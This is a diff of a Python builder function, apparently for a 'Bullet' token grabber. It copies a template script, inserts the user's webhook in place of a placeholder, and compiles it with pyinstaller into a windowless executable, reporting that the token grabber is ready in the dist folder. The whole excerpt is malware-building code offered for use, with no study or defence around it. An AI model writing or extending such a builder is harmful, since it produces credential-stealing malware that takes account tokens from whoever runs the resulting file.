@@ -44,11 +44,11 @@ def grabbing():
     sf = f"Bullet_{UI}.py"
     ef = f"Bullet_{UI}.exe"
 
-    shutil.copy("grabber.py", sf)
+    shutil.copy("build.py", sf)
     with open(sf, "r+", encoding="utf-8") as f:
         content = f.read()
         f.seek(0,0)
-        content = content.replace("hookz_here", hook)
+        content = content.replace("bulleting_hookz", hook)
         f.write(content)
     s.call(f"pyinstaller --onefile --noconsole {sf} --name {ef}", shell=True)
     print(f"\n{b} You can find the token grabber in dist folder.")
